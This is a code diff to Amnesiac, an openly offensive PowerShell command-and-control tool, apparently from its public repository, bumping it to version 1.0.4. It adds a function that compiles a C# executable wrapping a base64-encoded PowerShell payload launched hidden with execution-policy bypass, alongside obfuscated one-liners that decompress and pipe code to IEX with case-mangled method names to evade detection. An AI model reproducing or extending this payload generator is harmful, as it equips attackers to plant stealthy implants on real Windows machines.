@@ -170,6 +170,10 @@ function Amnesiac {
 				$global:Message = " [+] Payload format: gzip"
 			}
    			elseif($global:payloadformat -eq 'gzip'){
+				$global:payloadformat = 'exe'
+				$global:Message = " [+] Payload format: exe"
+			}
+			elseif($global:payloadformat -eq 'exe'){
 				$global:payloadformat = 'b64'
 				$global:Message = " [+] Payload format: cmd(b64)"
 			}
@@ -923,7 +927,7 @@ function Display-SessionMenu {
  #+#     #+# #+#       #+# #+#   #+#+# #+#       #+#    #+#    #+#     #+#     #+# #+#    #+# 
  ###     ### ###       ### ###    #### ########## ######## ########### ###     ###  ########  ')
 
-	$BannerLink = '                                           [Version: 1.0.3] https://github.com/Leo4j/Amnesiac'
+	$BannerLink = '                                           [Version: 1.0.4] https://github.com/Leo4j/Amnesiac'
 	
 	if($Night){
 		Write-Host $Banner -Foreground blue
@@ -1159,9 +1163,16 @@ while (`$true) {
 	$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
 	
 	if(!$HidePayload){
-		Write-Output ""
-		Write-Host " [+] Payload:" -Foreground cyan
-		Write-Output ""
+		if($global:payloadformat -eq 'exe'){
+			$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
+			Write-Host " [+] Payload saved to: $exefilelocation" -Foreground cyan
+			Write-Output ""
+		}
+		else{
+			Write-Output ""
+			Write-Host " [+] Payload:" -Foreground cyan
+			Write-Output ""
+		}
 		if($global:payloadformat -eq 'b64'){
 			Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
 			Write-Output ""
@@ -1192,6 +1203,12 @@ while (`$true) {
 			Write-Output ""
 			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
 			Write-Output ""
+		}
+  		elseif($global:payloadformat -eq 'exe'){
+			$ClientScriptEdit = $ClientScript += ";exit"
+			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
+			$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+			PS1ToEXE -content $exescript -outputFile $exefilelocation
 		}
 	}
 
@@ -1323,8 +1340,15 @@ while (`$true) {
 	Write-Output ""
 	Write-Host " [+] Global-Listener PipeName: $global:MultiPipeName" -Foreground yellow
 	Write-Output ""
-	Write-Host " [+] Payload:" -Foreground cyan
-	Write-Output ""
+	if($global:payloadformat -eq 'exe'){
+		$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
+		Write-Host " [+] Payload saved to: $exefilelocation" -Foreground cyan
+		Write-Output ""
+	}
+	else{
+		Write-Host " [+] Payload:" -Foreground cyan
+		Write-Output ""
+	}
 	if($global:payloadformat -eq 'b64'){
 		Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
 		Write-Output ""
@@ -1356,7 +1380,12 @@ while (`$true) {
 		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
 		Write-Output ""
 	}
-	
+	elseif($global:payloadformat -eq 'exe'){
+		$ServerScriptEdit = $ServerScript += ";exit"
+		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
+		$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+		PS1ToEXE -content $exescript -outputFile $exefilelocation
+	}
 	Start-Sleep 4
 }
 
@@ -1920,6 +1949,12 @@ function InteractWithPipeSession{
 				Write-Host ""
 			}
    			elseif($global:payloadformat -eq 'gzip'){
+				$global:payloadformat = 'exe'
+				Write-Host ""
+				Write-Host "[+] Payload format: exe" -Foreground yellow
+				Write-Host ""
+			}
+			elseif($global:payloadformat -eq 'exe'){
 				$global:payloadformat = 'b64'
 				Write-Host ""
 				Write-Host "[+] Payload format: cmd(b64)" -Foreground yellow
@@ -3243,6 +3278,50 @@ function InteractWithPipeSession{
 
 	}
 	
+}
+
+function PS1ToEXE {
+    Param (
+        [string]$content,
+		[string]$outputFile
+    )
+
+    $script = [System.Convert]::ToBase64String(([System.Text.Encoding]::UTF8.GetBytes($content)))
+
+    $translate = @"
+using System;
+using System.Management.Automation;
+using System.Text;
+using System.Reflection;
+
+namespace ModuleNamespace
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string script = @"$script";
+            PowerShell ps = PowerShell.Create();
+            ps.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(script)));
+            ps.Invoke();
+        }
+    }
+}
+"@
+
+    $assemblyPath = ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Management.Automation.dll" } | Select-Object -First 1).Location
+
+    $params = New-Object System.CodeDom.Compiler.CompilerParameters
+    $params.GenerateExecutable = $true
+    $params.OutputAssembly = $outputFile
+    $params.CompilerOptions = "/platform:x64 /target:exe"
+    $params.ReferencedAssemblies.Add("System.dll") > $null
+    $params.ReferencedAssemblies.Add("System.Core.dll") > $null
+    $params.ReferencedAssemblies.Add($assemblyPath) > $null
+
+    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+
+    $results = $provider.CompileAssemblyFromSource($params, $translate)
 }
 
 function CheckReachableHosts {
